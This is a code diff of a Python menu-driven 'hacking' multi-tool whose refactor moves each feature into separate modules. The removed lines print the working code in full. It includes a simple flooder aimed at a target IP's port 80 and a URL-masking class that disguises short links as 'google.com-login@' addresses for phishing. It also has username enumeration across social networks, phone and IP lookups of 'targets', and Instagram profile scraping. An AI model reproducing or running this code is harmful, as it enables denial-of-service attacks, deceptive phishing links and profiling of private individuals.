@@ -1,16 +1,13 @@
-import json,requests,time,os,phonenumbers
-import instaloader, socket, webbrowser, sys
-
-from phonenumbers import carrier, geocoder, timezone
-from requests.utils import quote as urlEncode
-from json import loads
-from requests import get
-from bs4 import BeautifulSoup
-from sys import stderr
-from pytube import YouTube
-from colorama import Fore, init
-
-
+from src.files.intProMode import intProModeF
+from src.files.numberMode import numberModeF
+from src.files.userSSMode import userSSModeF
+from src.files.mirrorMode import mirrorModeF
+from src.files.instaSMode import instaSModeF
+from src.files.maskinMode import maskinModeF
+from src.files.dossNNMode import dossNNModeF
+from src.files.encrypMode import encrypModeF
+from src.files.downloMode import downloModeF
+from src.files.dANDenMode import dANDenModeF
 
 Re, Gr, Wh, Ye= '\033[1;31m', '\033[1;32m', '\033[1;37m', '\033[1;33m'
 
@@ -24,313 +21,49 @@ def is_option(func):
 # FUNCTIONS FOR MENU
 @is_option
 def help():
-    print(f'\n{Gr} HELP FOR BEGINNERS')
+    print(f'\n{Gr} HELP FOR BEGINNERS\n')
     for opt in options:
         print(f' {Wh}[{opt["num"]}]{Gr} {opt["help"]}')
 
 @is_option
-def IntPrMode():
-    ip = input(f"{Wh}\n Enter IP target : {Gr}")  # INPUT IP ADDRESS
-    print()
-    print(f'{Gr} SHOW INFORMATION IP ADDRESS')
-    req_api = requests.get(f"http://ipwho.is/{ip}")  # API IPWHOIS.IS
-    ip_data = json.loads(req_api.text)
-    time.sleep(2)
-    print(f"{Wh}\n IP target       :{Gr}", ip)
-    print(f"{Wh} Type IP         :{Gr}", ip_data["type"])
-    print(f"{Wh} Country         :{Gr}", ip_data["country"])
-    print(f"{Wh} Country Code    :{Gr}", ip_data["country_code"])
-    print(f"{Wh} City            :{Gr}", ip_data["city"])
-    print(f"{Wh} Continent       :{Gr}", ip_data["continent"])
-    print(f"{Wh} Continent Code  :{Gr}", ip_data["continent_code"])
-    print(f"{Wh} Region          :{Gr}", ip_data["region"])
-    print(f"{Wh} Region Code     :{Gr}", ip_data["region_code"])
-    print(f"{Wh} Latitude        :{Gr}", ip_data["latitude"])
-    print(f"{Wh} Longitude       :{Gr}", ip_data["longitude"])
-    lat = int(ip_data['latitude'])
-    lon = int(ip_data['longitude'])
-    print(f"{Wh} EU              :{Gr}", ip_data["is_eu"])
-    print(f"{Wh} Postal          :{Gr}", ip_data["postal"])
-    print(f"{Wh} Calling Code    :{Gr}", ip_data["calling_code"])
-    print(f"{Wh} Capital         :{Gr}", ip_data["capital"])
-    print(f"{Wh} Borders         :{Gr}", ip_data["borders"])
-    print(f"{Wh} ISP             :{Gr}", ip_data["connection"]["isp"])
-    print(f"{Wh} Domain          :{Gr}", ip_data["connection"]["domain"])
-    print(f"{Wh} ID              :{Gr}", ip_data["timezone"]["id"])
-    print(f"{Wh} ABBR            :{Gr}", ip_data["timezone"]["abbr"])
-    print(f"{Wh} DST             :{Gr}", ip_data["timezone"]["is_dst"])
-    print(f"{Wh} Offset          :{Gr}", ip_data["timezone"]["offset"])
+def IntProMode():
+    intProModeF()
 
 @is_option
 def numberMode():
-    # INPUT NUMBER PHONE
-    User_phone = input(f"\n {Wh}Enter number target {Gr}Ex +39xxxx {Wh}: {Gr}")
-    default_region = "TO"  
-    # VARIABLE PHONENUMBERS
-    parsed_number = phonenumbers.parse(User_phone, default_region) 
-    region_code = phonenumbers.region_code_for_number(parsed_number)
-    jenis_provider = carrier.name_for_number(parsed_number, "en")
-    location = geocoder.description_for_number(parsed_number, "to")
-    is_valid_number = phonenumbers.is_valid_number(parsed_number)
-    is_possible_number = phonenumbers.is_possible_number(parsed_number)
-    formatted_number = phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)
-    formatted_number_for_mobile = phonenumbers.format_number_for_mobile_dialing(
-        parsed_number, default_region,with_formatting=True)
-    number_type = phonenumbers.number_type(parsed_number)
-    timezone1 = timezone.time_zones_for_number(parsed_number)
-    timezoneF = ', '.join(timezone1)
-
-    print(f"\n{Gr} SHOW INFORMATION PHONE NUMBERS\n")
-    print(f" {Wh}Region Code     :{Gr} {region_code}")
-    print(f" {Wh}Operator        :{Gr} {jenis_provider}")
-    print(f" {Wh}Valid number    :{Gr} {is_valid_number}")
-    print(f" {Wh}Possible number :{Gr} {is_possible_number}")
-    print(f" {Wh}International   :{Gr} {formatted_number}")
-    print(f" {Wh}Country code    :{Gr} {parsed_number.country_code}")
-    print(f" {Wh}Local number    :{Gr} {parsed_number.national_number}")
-    if number_type == phonenumbers.PhoneNumberType.MOBILE:
-        print(f" {Wh}Type            :{Gr} mobile number")
-    elif number_type == phonenumbers.PhoneNumberType.FIXED_LINE:
-        print(f" {Wh}Type            :{Gr} fixed-line number")
-    else:
-        print(f" {Wh}Type            :{Gr} unknown")
+    numberModeF()
 
 @is_option
 def userSSMode():
-    try:
-        username = input(f"\n {Wh}Enter Username : {Gr}")
-        results = {}
-        social_media = [
-            {"url": "https://www.facebook.com/{}", "name": "Facebook"},
-            {"url": "https://www.twitter.com/{}", "name": "Twitter"},
-            {"url": "https://www.instagram.com/{}", "name": "Instagram"},
-            {"url": "https://www.linkedin.com/in/{}", "name": "LinkedIn"},
-            {"url": "https://www.github.com/{}", "name": "GitHub"},
-            {"url": "https://www.pinterest.com/{}", "name": "Pinterest"},
-            {"url": "https://www.tumblr.com/{}", "name": "Tumblr"},
-            {"url": "https://www.youtube.com/{}", "name": "Youtube"},
-            {"url": "https://soundcloud.com/{}", "name": "SoundCloud"},
-            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
-            {"url": "https://www.tiktok.com/@{}", "name": "TikTok"},
-            {"url": "https://www.behance.net/{}", "name": "Behance"},
-            {"url": "https://www.medium.com/@{}", "name": "Medium"},
-            {"url": "https://www.quora.com/profile/{}", "name": "Quora"},
-            {"url": "https://www.flickr.com/people/{}", "name": "Flickr"},
-            {"url": "https://www.periscope.tv/{}", "name": "Periscope"},
-            {"url": "https://www.twitch.tv/{}", "name": "Twitch"},
-            {"url": "https://www.dribbble.com/{}", "name": "Dribbble"},
-            {"url": "https://www.stumbleupon.com/stumbler/{}", "name": "StumbleUpon"},
-            {"url": "https://www.ello.co/{}", "name": "Ello"},
-            {"url": "https://www.producthunt.com/@{}", "name": "Product Hunt"},
-            {"url": "https://www.snapchat.com/add/{}", "name": "Snapchat"},
-            {"url": "https://www.telegram.me/{}", "name": "Telegram"},
-            {"url": "https://www.weheartit.com/{}", "name": "We Heart It"}
-        ]
-        for site in social_media:
-            url = site['url'].format(username)
-            response = requests.get(url)
-            if response.status_code == 200:
-                results[site['name']] = url
-            else:
-                results[site['name']] = (f"{Re}! Username not found !")
-    except Exception as e:
-        print(f"{Re}Error : {e}")
-        return
-
-    print(f"\n{Gr} SHOW INFORMATION USERNAME")
-    print()
-    for site, url in results.items():
-        print(f"{Wh} {Gr}+ {Wh} {site} : {Gr}{url}")
+    userSSModeF()
 
 @is_option
 def mirrorMode():
-    respone = requests.get('https://api.ipify.org/')
-    Show_IP = respone.text
-
-    print(f"\n{Gr} SHOW INFORMATION YOUR IP")
-    print(f"\n{Wh}{Gr} + {Wh} Your IP Adrress : {Gr}{Show_IP}")
+    mirrorModeF()
 
 @is_option
 def instaSMode():
-    URL = "https://www.instagram.com/{}/"
-    username = input(f"\n {Wh}Enter username target : {Gr}")
-    print(f"\n{Gr} SHOW INFORMATION IG USER\n")
-    # getting the request from url
-    r = requests.get(URL.format(username))
-
-    # converting the text
-    s = BeautifulSoup(r.text, "html.parser")
-
-    # finding meta info
-    meta = s.find("meta", property ="og:description")
-
-    # calling parse method
-    s = meta.attrs['content']
-    data = {}
-
-    # splitting the content 
-    # then taking the first part
-    s = s.split("-")[0]
-
-    # again splitting the content 
-    s = s.split(" ")
-
-    # assigning the values
-    data['Followers'] = s[0]
-    data['Following'] = s[2]
-    data['Posts'] = s[4]
-
-	
-    print(f" {Wh}Followers            :{Gr} {data['Followers']}")
-    print(f" {Wh}Following            :{Gr} {data['Following']}")
-    print(f" {Wh}Posts                :{Gr} {data['Posts']}\n")
-
-    try:
-        ig = instaloader.Instaloader()
-        ig.download_profile(username , profile_pic=True)
-    except:
-        print(f'\n {Re}!This is a private account!')
+    instaSModeF()
 
 @is_option
 def maskinMode():
-    class Doppelgang:
-        def __init__(self,url,maskingDomain="google.com",keyword="login"):
-            self.url = url
-            self.maskingDomain = maskingDomain
-            self.keyword = keyword
-            self.shorturl = None
-        def shorten(self):
-            encodedUrl = urlEncode(self.url)
-            res = get(f"https://is.gd/create.php?format=json&url={encodedUrl}").text
-            json = loads(res)
-            try:
-                self.shorturl = json["shorturl"]
-            except:
-                self.shorturl = self.url
-            return self.shorturl
-
-        def mask(self):
-            maskedURL = self.shorturl.replace("https://",f"https://{self.maskingDomain}-{self.keyword}@")
-            return maskedURL
-
-    url = input(f"\n{Wh} Enter the url to be masked: {Gr}")
-    mask = input(f"{Wh} Enter a masking domain: {Gr}")
-    keyword = input(f"{Wh} Type a kewword [no whiteSP]: {Gr}")
-    target = Doppelgang(url,mask,keyword)
-    target.shorten()
-    print(f"{Wh} Output url: {Gr}",target.mask())
+    maskinModeF()
 
 @is_option
 def dossNNMode():
-    target = input(f"\n{Wh} Enter target ip:{Gr} ")
-
-    for i in range(1,200):
-        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((target,80))
-        data = b"GET / HTTP 1.1\r\n"*1000
-        s.send(data)
-        s.close()
+    dossNNModeF()
 
 @is_option
 def encrypMode():
-    print(f' \n{Gr}Sorry, this will be added soon')
+    encrypModeF()
 
 @is_option
 def downloMode():
-    links=list()
-    # Example usage
-    link = input(f'\n {Wh}target video URL: {Gr}')
-    links.append(link)
-
-    if len(links) == 0:
-        print(f" {Re}!There are no urls available!")
-        sys.exit()
-    
-    for link in links:
-        url = link.strip()
-        #check if the os is windows/macOS it save all videos in videos folder
-        if os.name == 'nt' or os.name == 'posix':
-            output_path = ""
-
-            yt = YouTube(url)
-            stream = yt.streams.filter(progressive=True, resolution="720p").filter(only_audio=False).first()
-            # Try to find a 720p video with audio
-            if not stream:
-                stream = yt.streams.filter(progressive=True, resolution="480p").filter(only_audio=False).first()
-            # If no 480p video found, try 360p
-            elif not stream:
-                stream = yt.streams.filter(progressive=True, resolution="360p").filter(only_audio=False).first()
-            # Download the stream
-            if stream:
-                print(f"\n{Gr} Please wait downloading..")
-                stream.download(output_path)
-                print(f"{Gr} Download Completed {output_path}\n")
-            else:
-                print(f"{Re} !Couldn't find video!\n")
-
-        #if the os is linux/termux it save all videos in Download/YT_Downloader folder
-        else:
-            output_path = ""
-            yt = YouTube(url)
-            stream = yt.streams.filter(progressive=True, resolution="720p").filter(only_audio=False).first()
-            # Try to find a 720p video with audio
-            if not stream:
-                stream = yt.streams.filter(progressive=True, resolution="480p").filter(only_audio=False).first()
-            # If no 480p video found, try 360p
-            elif not stream:
-                stream = yt.streams.filter(progressive=True, resolution="360p").filter(only_audio=False).first()
-            # Download the stream
-            if stream:
-                print(f"{Gr} Please wait downloading..")
-                stream.download(output_path)
-                print(f"{Gr} Download Completed - {output_path}\n")
-            else:
-                print(f"{Re} !Couldn't find video!\n")
-
-    print(f"{Gr} Video Downloaded Complete")
+    downloModeF()
 
 @is_option
-def dANDeMode():
-    e = {'a':' 0001','b':' 0010','c':' 0100','d':' 1000',
-         'e':' 0002','f':' 0020','g':' 0200','h':' 2000',
-         'i':' 0003','l':' 0030','m':' 0300','n':' 3000',
-         'o':' 0004','p':' 0040','q':' 0400','r':' 4000',
-         's':' 0005','t':' 0050','u':' 0500','v':' 5000',
-         'z':' 0006','k':' 0666','w':' 0600','x':' 6000',
-         'y':' 0060','j':' 6600'}
-
-    d ={'0001':'a','0010':'b','0100':'c','1000':'d',
-        '0002':'e','0020':'f','0200':'g','2000':'h',
-        '0003':'i','0030':'l','0300':'m','3000':'n',
-        '0004':'o','0040':'p','0400':'q','4000':'r',
-        '0005':'s','0050':'t','0500':'u','5000':'v',
-        '0006':'z','0666':'k','0600':'w','6000':'x',
-        '0060':'y','6600':'j'}
-
-    inp = input(f"\n{Wh} encode or decode: {Gr}")
-    inp = inp.lower()
-    print(f'\n{Gr} info: recommended to use [space? space] to divide words')
-    msg = input(f"\n{Wh} target msg for {inp}: {Gr}")
-    msg = msg.lower()
-
-    if inp == 'encode':
-        encodeMsg = ''
-        for c in range(len(msg)):
-            try:
-                encodeMsg = encodeMsg + e[msg[c]]
-            except:
-                encodeMsg = encodeMsg + msg[c]
-        print(f'{Wh} Encoded msg: {Gr}{encodeMsg}')
-
-    elif inp == 'decode':
-        msg = msg.split()
-        decodeMsg = ''
-        for c in range(len(msg)):
-            try:
-                decodeMsg = decodeMsg + d[msg[c]]
-            except:
-                decodeMsg = decodeMsg + '?'
-        print(f' {Wh}Decoded msg: {Gr}{decodeMsg}')
+def dANDenMode():
+    dANDenModeF()
 
 
 options = [
@@ -350,7 +83,7 @@ options = [
         'num': 12,
         'text': 'Internet Protocol Tracker',
         'help' : 'IP Tracker',
-        'func': IntPrMode
+        'func': IntProMode
     },
     {
         'num': 13,
@@ -405,6 +138,6 @@ options = [
         'num': 21,
         'text': 'Encode or Decode MSG',
         'help' : 'Encode or Decode Messages',
-        'func': dANDeMode
+        'func': dANDenMode
     },
 ]
